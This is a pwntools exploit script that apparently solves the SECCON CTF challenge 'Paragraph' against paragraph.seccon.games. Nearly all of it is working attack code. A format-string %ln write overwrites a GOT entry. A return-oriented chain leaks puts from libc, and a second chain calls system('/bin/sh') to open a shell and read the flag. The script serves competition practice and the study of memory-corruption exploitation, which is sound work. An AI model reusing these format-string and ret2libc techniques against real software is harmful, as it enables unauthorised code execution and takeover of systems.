#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
b *main+100
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'paragraph.seccon.games'
    port = int(args.PORT or 5000)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


"""
[*] '/home/rivit/Downloads/seccon/Paragraph/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No


"""


target = 0x4010A4

sla(b'asked', flat(
    f'%{target}c%8$lnAA'.encode(),
    p64(0x404028)
)[:-1])

ru(b'@@')


pop_rdi = 0x00401283 #: pop rdi; ret;
OFFSET = 40

pld = flat(
    cyclic(OFFSET),
    pop_rdi,
    exe.got.puts,
    exe.sym.puts,
    exe.sym.main,
    filler=b'A',
    length=0x100
)

sl(flat(
    b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted ",
    pld,
    b" warmly.\n"
))

sl(b'nothing')

libc_leak = rl().strip()
info(f'libc_leak: {libc_leak}')

puts = u64(libc_leak.ljust(8, p8(0)))
info(f'puts: {puts:#x}')

libc = exe.libc
libc.address = puts-libc.sym.puts
binsh = next(libc.search(b'/bin/sh\x00'))

info(f'libc.address: {libc.address:#x}')

pld = flat(
    cyclic(OFFSET),
    pop_rdi,
    binsh,
    pop_rdi+1, # ret
    libc.sym.system,
    length=0x100
)

sl(flat(
    b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted ",
    pld,
    b" warmly.\n"
))

sl(b'cat /flag*')
sl(b'cat /flag*')

ia()
